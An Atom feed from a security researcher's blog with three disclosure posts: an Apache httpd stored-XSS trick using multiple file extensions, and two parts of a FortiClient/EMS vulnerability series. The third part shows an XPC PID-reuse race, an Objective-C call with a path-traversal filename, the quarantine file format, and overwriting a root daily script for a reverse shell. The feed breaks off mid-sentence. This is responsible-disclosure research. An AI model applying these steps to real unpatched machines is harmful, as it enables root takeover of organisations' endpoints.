<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaniv Nizry Blogs</title>
  
  
  <link href="https://yaniv-git.github.io/atom.xml" rel="self"/>
  
  <link href="https://yaniv-git.github.io/"/>
  <updated>2025-07-08T15:29:30.239Z</updated>
  <id>https://yaniv-git.github.io/</id>
  
  <author>
    <name>Yaniv Nizry</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache httpd XSS Using Multiple Extensions</title>
    <link href="https://yaniv-git.github.io/2025/07/07/Apache%20httpd%20XSS%20using%20multiple%20extensions/"/>
    <id>https://yaniv-git.github.io/2025/07/07/Apache%20httpd%20XSS%20using%20multiple%20extensions/</id>
    <published>2025-07-07T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This post dives into a stored Cross-Site Scripting (XSS) technique I discovered while researching Fortinet’s endpoint protection solution. It builds on previous work, specifically <a href="https://yaniv-git.github.io/2025/06/29/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%202/#From-Limited-File-Write-to-XSS-CVE-2025-22859">part two</a> of my series (CVE-2025-22859), where I detailed an <code>httpd</code> stored XSS vulnerability using a files with a predefined extensions.</p><p>I have already <a href="https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/">covered</a> a small technique of achieving XSS on <code>httpd</code> when the attacker can’t control the file extension. However, unlike that prior method, which involved creating files with no name or only dots to bypass extension assignage, this new trick doesn’t depend on the absense of the <code>X-Content-Type-Options: nosniff</code> header. Complicating the other writeup, making these nice to add to our toolbox.</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>The core of this technique lies in how <a href="https://httpd.apache.org/">Apache httpd’s</a> <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a> module determines a file’s <code>Content-Type</code>. Typically, <code>mod_mime</code> guesses the content type based on the file’s extension. If the <code>X-Content-Type-Options: nosniff</code> header is present, browsers are instructed not to “sniff” the content type and will default to <code>text/plain</code> when an <code>Content-Type</code> isn’t set. However, a closer look at the <code>mod_mime</code> documentation reveals an interesting behavior: </p><img src="/img/blogs/fortinet/2/mod_mime_doc.png" style="width: 100%;"/><p>Files can have <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html#multipleext" title="multiple extensions">multiple extensions</a>, with a priority given to the last one. For example, these file extensions will correspond to the following content-types:</p><table><thead><tr><th>File Extension</th><th>mod_mime Content-Type</th></tr></thead><tbody><tr><td>Filename.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>gif</strong></td><td>image&#x2F;gif</td></tr><tr><td>Filename.gif.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>unknown</strong></td><td></td></tr><tr><td>Filename.unknown.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>html</strong>.unknown</td><td>text&#x2F;html</td></tr></tbody></table><h1 id="The-Attack-Scenario"><a href="#The-Attack-Scenario" class="headerlink" title="The Attack Scenario"></a>The Attack Scenario</h1><p>Armed with this knowledge, in a scenario where an attacker has the ability to upload a file, but can’t control the extension. If the extension doesn’t correlate to any content type in <code>mod_mime</code> (for example <code>.abc</code>),  all the attacker would need to do is to add <code>.html</code> to the filename (<code>filename.html.abc</code>). When Apache serves this file, <code>mod_mime</code> will process the multiple extensions, recognize <code>.html</code> as the last and most significant one since <code>.abc</code> doesnt cererlate ot anything, and serve the file with <code>Content-Type: text/html</code>, resulting in stored XSS. This technique might also be used to bypass some server-side validation that only permits specific file types.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://yaniv-git.github.io/2025/06/29/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%202/#From-Limited-File-Write-to-XSS-CVE-2025-22859">CVE-2025-22859 blog</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">X-Content-Type-Options</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type</a></li><li><a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a></li><li><a href="https://x.com/YNizry/status/1940053407127007587">Tweet</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This post dives into a stored </summary>
      
    
    
    
    
    <category term="apache" scheme="https://yaniv-git.github.io/tags/apache/"/>
    
    <category term="content-type" scheme="https://yaniv-git.github.io/tags/content-type/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations (3/3)</title>
    <link href="https://yaniv-git.github.io/2025/07/07/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%203/"/>
    <id>https://yaniv-git.github.io/2025/07/07/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%203/</id>
    <published>2025-07-07T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.240Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome back to our Caught in the FortiNet series. In these blog posts, we’re uncovering multiple vulnerabilities in FortiClient and the Endpoint Management System (EMS). When chained together, these vulnerabilities could lead to the compromise of an entire organization. <a href="https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-1-3/">In previous posts</a>, we detailed how an attacker could gain initial access within an organization by exploiting FortiClient, then spreading to other endpoints on the network using a vulnerability in the EMS.</p><p>In this last article of the series, we will showcase a vulnerability enabling the attacker to go the last mile. Despite compromising all endpoints, an attacker would still be executing code under the same low-privileged user as FortiClient’s UI, as the vulnerability leverages weaknesses in the Electron framework of the app. However, during our research on FortiClient, we discovered a local privilege escalation affecting macOS machines running FortiClient.</p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Though each vulnerability’s impact differs, when chained together, they form a severe threat capable of granting an attacker complete organizational control with minimal user interaction. The vulnerabilities are tracked as:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue</li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><img src="/img/blogs/fortinet/3/overview.png" style="width: 100%;"/><p>In this last part of the series, we will focus on CVE-2025-25251, which affects FortiClient on macOS. This vulnerability allows an attacker who already have execute code capabilities on the victim’s machine to escalate their privileges to root.</p><iframe width="736" height="414" src="https://www.youtube.com/embed/MqByEXOsEAQ" title="Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>As we’ve covered in previous posts, FortiClient is built upon the <a href="https://www.electronjs.org/">Electron framework</a>, which enables convenient cross-platform development and provides a web-based graphical user interface (GUI). This Electron GUI runs as a process under the permission of the logged-in user.</p><img src="/img/blogs/fortinet/3/activity_monitor.png" style="width: 100%;"/><p>When an attacker exploits CVE-2025-22855 (which we discussed in <a href="https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-1-3/">Part 1</a>), the arbitrary code they execute inherits the same permissions as the exploited process, which means it runs under the current user’s privileges. However, FortiClient is powerful software that is capable of enabling VPN connections, running system scans, installing certificates, and more. All of these operations require elevated (root) permissions. So, how does FortiClient achieve this when this process is only running with user privileges?</p><p>The Electron UI, while being the visible interface of the application, is only the tip of the iceberg. Beneath it, multiple processes and services run in the background, each with different responsibilities and permissions. This design adheres to the principle of least privilege, separating permission levels and granting only the necessary permissions for each function. The elevated processes, often referred to as “helper tools” and commonly registered as <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">LaunchDaemons</a>, facilitate specific actions that require root access. Since the UI itself doesn’t require root, it can run with the current user’s permissions.</p><p>But when separating components, developers must ensure they still work together seamlessly. This is achieved using <a href="https://developer.apple.com/documentation/xpc?language=objc">XPC</a> (macOS <a href="https://en.wikipedia.org/wiki/Inter-process_communication">Interprocess Communication</a>):</p><img src="/img/blogs/fortinet/3/xpc_services.png" style="width: 100%;"/><p>Apple provides developers with the option to create XPC services, which expose specific functionalities. A client process can initiate an XPC request to a service registered on the machine, thereby triggering particular application logic. Crucially, any process on the machine can act as a “client”, initiating a request to any available service currently running. This means it is the sole responsibility of the listener service to authorize the client.</p><p>One common method developers use to authenticate and authorize the client process is by verifying its <a href="https://developer.apple.com/documentation/security/code-signing-services">code signature</a>. This is a default requirement on macOS for any executable to run. Within this signature, there’s a value called the <a href="https://developer.apple.com/documentation/automaticassessmentconfiguration/aeassessmentapplication/teamidentifier?language=objc">Team Identifier</a>, which serves as a unique ID for the developer of the software. By using this, an application can ascertain which team developed a given executable and confirm that its code has not been tampered with.</p><p>However, when we examined FortiClient’s privileged executables and their corresponding XPC verification mechanisms, we discovered a shared vulnerable practice that enables attackers to bypass this crucial security check.</p><h2 id="PID-reuse-CVE-2025-25251"><a href="#PID-reuse-CVE-2025-25251" class="headerlink" title="PID reuse (CVE-2025-25251)"></a>PID reuse (CVE-2025-25251)</h2><p>The main handler of XPC requests starts at the <a href="https://developer.apple.com/documentation/foundation/nsxpclistenerdelegate/listener(_:shouldacceptnewconnection:)?language=objc">shouldAcceptNewConnection</a> function. Here, Fortinet first retrieves the <a href="https://en.wikipedia.org/wiki/Process_identifier">Process Identifier</a> (PID) of the client’s process and then passes it to the <code>isValidPid</code> function:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="title class_">ServiceDelegate</span><span class="symbol">:</span><span class="symbol">:listener</span><span class="symbol">:shouldAcceptNewConnection</span>:</span><br><span class="line">               (<span class="variable constant_">ID</span> param_1,<span class="variable constant_">SEL</span> param_2,<span class="variable constant_">ID</span> param_3,<span class="variable constant_">ID</span> param_4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="regexp">//</span>...</span><br><span class="line">  auVar5 = _objc_msgSend<span class="variable">$processIdentifier</span>();</span><br><span class="line">  bVar1 = _objc_msgSend<span class="variable">$isValidPid</span><span class="symbol">:</span>(param_1,auVar5._8_8_,auVar5._0_8_);</span><br><span class="line"><span class="regexp">//</span>...</span><br></pre></td></tr></table></figure><p>Within <code>isValidPid</code>, the <code>_proc_pidpath</code> function is used to retrieve the executable path associated with the client’s PID.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> ServiceDelegate::isValidPid:(ID param_1,SEL param_2,<span class="type">int</span> param_3)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">//...</span></span><br><span class="line"> _proc_pidpath((<span class="type">int</span>)uVar3,local_439,<span class="number">0x401</span>);</span><br><span class="line"> Var1 = _verifySignature(local_439);</span><br><span class="line"> <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>This path is then sent to the <code>_verifySignature</code> function, which extracts the executable’s code signature and compares its Team ID against a hardcoded Fortinet Team ID.</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ulong <span class="variable">_verifySignature</span>(ulong param_1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> ((param_1 != <span class="number">0</span>) &amp;&amp; (param_1 = <span class="variable">_CFStringCreateWithCString</span>(<span class="number">0</span>,param_1,<span class="number">0</span>x8000100), param_1 != <span class="number">0</span>)) &#123;</span><br><span class="line">    local_38 = <span class="number">0</span>;</span><br><span class="line">    lVar2 = <span class="variable">_CFURLCreateWithFileSystemPath</span>(<span class="number">0</span>,param_1,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">_CFRelease</span>(param_1);</span><br><span class="line">      param_1 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      iVar1 = <span class="variable">_SecStaticCodeCreateWithPath</span>(lVar2,<span class="number">0</span>,&amp;local_38);</span><br><span class="line">      uVar4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        local_40 = <span class="number">0</span>;</span><br><span class="line">        iVar1 = <span class="variable">_SecCodeCopySigningInformation</span>(local_38,<span class="number">2</span>,&amp;local_40);</span><br><span class="line">        uVar4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (local_40 != <span class="number">0</span>)) &#123;</span><br><span class="line">          team_id = <span class="variable">_CFDictionaryGetValue</span></span><br><span class="line">                            (local_40,*(undefined8 *)PTR__kSecCodeInfoTeamIdentifier_10004c288);</span><br><span class="line">          <span class="keyword">if</span> ((team_id == <span class="number">0</span>) || (lVar3 = <span class="variable">_CFStringCompare</span>(team_id,&amp;cf_AH4XFXJ7DK,<span class="number">0</span>), lVar3 != <span class="number">0</span>)) &#123;</span><br></pre></td></tr></table></figure><p>While at a glance, comparing the client’s executable signature to Fortinet’s team ID appears to be robust, the way they have implemented it is susceptible to a <strong>race condition</strong>. An attacker can initiate an XPC request from their malicious client process. Immediately after sending the request, they can use <code>posix_spawn</code> to switch the executable associated with their client’s PID to a legitimate Fortinet executable.</p><img src="/img/blogs/fortinet/3/race.gif" style="width: 100%;"/><p>If this switch occurs before the listener service fetches the process path from the PID, then the executable that undergoes the signature check will be the legitimate Fortinet executable. Attackers can increase the reliability of this race condition by forking multiple processes and sending numerous XPC messages. This tactic enqueues the messages, slowing down the listener’s verification process and extending the time window for the attacker to successfully perform the executable swap.</p><h2 id="From-vulnerability-to-impact"><a href="#From-vulnerability-to-impact" class="headerlink" title="From vulnerability to impact"></a>From vulnerability to impact</h2><p>This vulnerability allows an attacker, who has already achieved code execution on a victim’s machine, to execute arbitrary XPC requests on FortiClient’s privileged services. By itself, this doesn’t immediately imply any impact, as the attacker’s capabilities are limited to the functionality exposed by the XPC services. To execute code with the XPC service’s permissions (root), attackers must identify what functions they can invoke and determine if these functions can be leveraged for further exploitation.</p><p>In our search for such functions, we discovered the <code>runTool</code> function within the <code>fctservctl2</code> service. This function offers multiple purposes, determined by the ID provided. Specifically, an interesting code block caught our attention under ID 11:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pFVar3 = <span class="variable">_fopen</span>(pcVar2,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">pFVar5 = <span class="variable">_fopen</span>(local_520,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="comment">//... some kind of magic ...</span></span><br><span class="line"><span class="variable">_fwrite</span>(abStack_105a0,(long)iVar1,<span class="number">1</span>,pFVar5);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">_fchmod</span>(iVar1,uStack_e8._4_2_);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">_fchown</span>(iVar1,local_f0._4_4_,(gid_t)uStack_e8);</span><br><span class="line"><span class="variable">_unlink</span>(pcVar2);</span><br></pre></td></tr></table></figure><ol><li>This code first reads a file from a path provided in the XPC request.</li><li>Creates a new file.</li><li>Performs some manipulation on the content of the original file.</li><li>Writes the modified content to the new file. </li><li>Then updates the file permissions and owner. </li><li>Finally, it deletes the original file that was read.</li></ol><p>While this sequence of operations might seem unusual at first glance, it makes perfect sense when we understand the function’s purpose. FortiClient includes a feature that scans files for malware on the machine. If a malicious file is detected, FortiClient <a href="https://docs.fortinet.com/document/forticlient/7.4.3/ems-administration-guide/768296/quarantine-management">quarantines</a> it by moving it to a restricted folder (<code>/Library/Application Support/Fortinet/FortiClient/data/quarantine_sandbox/</code>). It also modifies the file’s content, permissions, and owner to prevent it from being accessed and executed. A common practice among antivirus software.</p><p>This specific <code>runTool:11</code> XPC request is designed to <strong>unquarantine a file</strong>. It restores all metadata and content of a quarantined file and moves it to a destination defined in the XPC request. If an attacker can create a fake quarantined file and then exploit the <code>PID reuse</code> vulnerability to initiate the unquarantine process, they would effectively achieve an <strong>arbitrary file write with root privileges</strong>.</p><p>However, there’s a small hurdle: legitimate quarantined files are stored within a folder that requires elevated permissions to access. We noticed that when sending a file name in the XPC message, attackers can traverse back and point to any file on the system.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> arg1 = <span class="number">11</span>;</span><br><span class="line">NSDictionary *arg2 = @&#123;</span><br><span class="line"><span class="meta">@<span class="string">&quot;FileName&quot;</span>:@<span class="string">&quot;../../../../../../../../../../Users/user/Desktop/fake_quarantined.txt&quot;</span>,</span></span><br><span class="line"><span class="meta">@<span class="string">&quot;sandbox&quot;</span>:@<span class="number">0</span>,</span></span><br><span class="line"><span class="meta">@“DestDir”:@<span class="string">&quot;/&quot;</span></span></span><br><span class="line">&#125;;</span><br><span class="line">[xpcConnection.remoteObjectProxy runTool:arg1 arguments:arg2 withReply:^(<span class="built_in">int</span> arg3)&#123;&#125;];</span><br></pre></td></tr></table></figure><p>From this root-level arbitrary file write, there are numerous options to achieve code execution. But first, we have to reverse engineer the quarantine file format:</p><ul><li><code>0xc0</code> (192) bytes, which consists of:<ul><li>HEADER_BYTES: <code>0x3209</code></li><li>40 bytes PADDING1</li><li>FILENAME length (max <code>0x400</code>)</li><li>UNKNOWN length (max <code>0x80</code>, we are not sure what this is used for)</li><li>OWNER (8 bytes, used for chown)</li><li>PERMISSION (8 bytes, used for chmod)</li><li>PADDING2 (to fit the <code>0xc0</code> size)</li></ul></li><li>FILENAME</li><li>UNKNOWN</li><li><code>0xab</code> XOR-ed file content</li></ul><p>Using this, attackers can create a simple script that generates a fake quarantined file. Then, one of the simplest methods an attacker could use is to overwrite a daily periodic script, located at <code>/private/etc/periodic/daily/999.local</code>, which is executed daily as root. In the following screenshot, we can see how the file has been changed</p><img src="/img/blogs/fortinet/3/lpe_terminal.png" style="width: 100%;"/><p>On a different terminal, attackers will set up a reverse shell listener and will wait for the daily script to run. After its execution, they will be granted root privileges:</p><img src="/img/blogs/fortinet/3/reverse_shell.png" style="width: 100%;"/><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>While our research uncovered several FortiClient code execution vulnerabilities. We decided to focus on the simplest, ‘one-click outdated Electron’ method, due to its simplicity and minimal user interaction. All discovered methods ultimately lead to the same result.</p><p>The vulnerabilities we discovered are fixed in the following versions:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0.</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue. </li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><p>We urge customers to update their affected Fortinet products to the fixed versions.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2024-11-20</td><td>We report all issues to Fortinet</td></tr><tr><td>2024-11-29</td><td>Fortinet acknowledges the receipt of the report</td></tr><tr><td>2024-12-18</td><td>Fortinet confirms the issues are being worked on</td></tr><tr><td>2025-01-28</td><td>CVE-2025-22855 and CVE-2025-22859 are assigned</td></tr><tr><td>2025-03-05</td><td>CVE-2025-25251 is assigned</td></tr><tr><td>2025-03-28</td><td>CVE-2025-31366 and CVE-2025-31365 are assigned</td></tr><tr><td>2025-04-08</td><td>CVE-2025-22855 is published</td></tr><tr><td>2025-04-08</td><td>Fortinet shares the CVSS scoring with us</td></tr><tr><td>2025-04-08</td><td>We request further clarification about the scoring</td></tr><tr><td>2025-04-10</td><td>Fortinet shares further CVSS details with us</td></tr><tr><td>2025-04-11</td><td>We provide our feedback regarding the CVSS scoring</td></tr><tr><td>2025-05-13</td><td>CVE-2025-22859 and CVE-2025-25251 are published</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this post, we have taken a deeper look into the inner workings of FortiClient and EMS, how they communicate, and what a malicious client could exploit. Using the vulnerability covered in this article, attackers who are authenticated to an EMS can traverse back the upload directory and create arbitrary files on the server with a limited name. We covered a technique attackers can use to overcome this limitation and achieve stored XSS in Apache httpd. </p><p>The impact of this vulnerability, when exploited, is the ability to force all the endpoints managed by the EMS to connect to a malicious EMS. This, combined with other vulnerabilities we uncovered, could potentially lead to remote code execution on every endpoint machine within an organization.</p><p>In the next blog post, we will go back to focusing on FortiClient and understand more details about its inner workings and what an attacker can exploit further.</p><p>We would like to thank the Fortinet PSIRT for their collaboration and responsiveness in addressing these findings.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome back to our Caught in the FortiNet series. In these blog posts, we’re uncovering multiple vulnerabilities in FortiClient and the </summary>
      
    
    
    
    
    <category term="Fortinet" scheme="https://yaniv-git.github.io/tags/Fortinet/"/>
    
    <category term="chain" scheme="https://yaniv-git.github.io/tags/chain/"/>
    
    <category term="lpe" scheme="https://yaniv-git.github.io/tags/lpe/"/>
    
    <category term="macos" scheme="https://yaniv-git.github.io/tags/macos/"/>
    
    <category term="osx" scheme="https://yaniv-git.github.io/tags/osx/"/>
    
  </entry>
  
  <entry>
    <title>Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations (2/3)</title>
    <link href="https://yaniv-git.github.io/2025/06/29/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%202/"/>
    <id>https://yaniv-git.github.io/2025/06/29/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%202/</id>
    <published>2025-06-29T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<p>Fortinet, a global leader in cybersecurity solutions, provides a wide array of products designed to safeguard organizations from increasingly sophisticated threats. However, the very nature of these critical security tools makes them prime targets for malicious actors. What happens when the tool designed to protect an organization becomes a vulnerability?</p><p>Continuing our exploration of the severe vulnerabilities we uncovered in Fortinet’s FortiClient and EMS, we move beyond the initial compromise. <a href="https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-1-3/" title="In our previous post">In our previous post</a>, we showed how an attacker gains an initial foothold by manipulating an endpoint victim to click on a link. Now, we follow the attacker’s path, outlining the steps of lateral movement and an EMS vulnerability that can lead to full organizational compromise.</p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Though each vulnerability’s impact differs, when chained together, they form a severe threat capable of granting an attacker complete organizational control with minimal user interaction. The vulnerabilities are tracked as:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue</li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><p>In this part of the blog series, we will focus on CVE-2025-22859, which enables an authenticated attacker to upload a stored XSS payload to a Linux-based EMS server. Exploiting this vulnerability, an attacker can manipulate an EMS user into clicking a malicious link, forcing all registered endpoints to switch connection to a malicious EMS server without any interaction from the clients. This makes them susceptible to arbitrary code execution, as showcased in the previous blog. </p><iframe width="736" height="414" src="https://www.youtube.com/embed/MqByEXOsEAQ" title="Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In the previous blog, we showcased how an attacker can execute arbitrary code on a machine running FortiClient by manipulating a victim to click on a link. When doing so, FortiClient connects to a malicious EMS server, which then sends a malicious HTML message that is rendered in an outdated isolated Electron window.</p><p>As mentioned in the previous blog, in addition to the outdated Chromium, the attacker’s controlled content window is rendered under the <code>file://</code> protocol. Since the main Electron window of FortiClient also uses this scheme, certain things are shared. We noticed that in the <code>localStorage</code>, FortiClient saves information regarding the last connected EMS (invitation code for Fortinet Cloud or an IP&#x2F;domain of an on-premise EMS). Considering a scenario where an attacker compromises an endpoint within an organization, the “previous EMS” will most likely point to the organization’s legitimate EMS. Using this information, the attacker can now reconnect to the legitimate organizational EMS, becoming a malicious authenticated client. </p><p>As an attacker advances, new attack surfaces are unveiled. To understand the potential risk of a malicious client to an EMS, we first need to understand the basics of how FortiClient and EMS are communicating:</p><h2 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h2><p>FortiClient and the EMS communicate using a custom, line-based protocol. The client’s request consists of key-value headers separated by the equal character (<code>=</code>). A body starts with the request type, followed by key-value pair data separated by the pipe (“<code>|</code>“) character. To finalize the request, the end type sequence is present.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MSG_HEADER: <span class="attribute">FCTUID</span>=C511A8F3ACBE5FA4ADD13F12E77647F9</span><br><span class="line"><span class="attribute">FCTVER</span>=7.2.4.0850</span><br><span class="line"><span class="attribute">PROTO_VER</span>=1.0.0</span><br><span class="line"><span class="attribute">KEY</span>=VALUE</span><br><span class="line"><span class="attribute">KEY2</span>=VALUE2</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">X-FCCK-PROBE: PROBE_FEATURE_BITMAP|1|KEY|VALUE|KEY2|VALUE2|<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">X-FCCK-PROBE-END\r\n</span><br></pre></td></tr></table></figure><p>The response message consists only of the type and body data: </p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCPROBERPLY: FGT|<span class="type">FCTEMS000000000</span>:i<span class="number">-0</span>fe6110e2e9410000|<span class="type">FEATURE_BITMAP</span>|<span class="type">7</span>|<span class="type">EMSVER</span>|<span class="type">7004000</span>|<span class="type">\r</span>\n</span><br></pre></td></tr></table></figure><p>The communication sequence, initially starts with a probe request, meant to verify that the server is an EMS and running a compatible version. Followed by the registration flow, which we covered in the previous blog.</p><img src="/img/blogs/fortinet/2/login_con.png" style="width: 100%;"/><p>Upon successful authentication, the connection is maintained via the client’s keep-alive messages every <em><code>X</code></em> seconds, which is defined by the server. These keep-alive messages are meant to ensure that the client is still connected to the EMS but also update information on the client, for example, if the IP is changed. The EMS utilizes the response message to perform actions from the client, such as showing a message window or requesting logs.</p><img src="/img/blogs/fortinet/2/mantaining_con.png" style="width: 100%;"/><p>Lastly, FortiClient can upload data to the EMS using a data request (<code>DATA_HEADER</code>). This can be followed by an upload request from the EMS (such as diagnostic results), but can also be initiated purely by the client, for example, when the user updates their profile 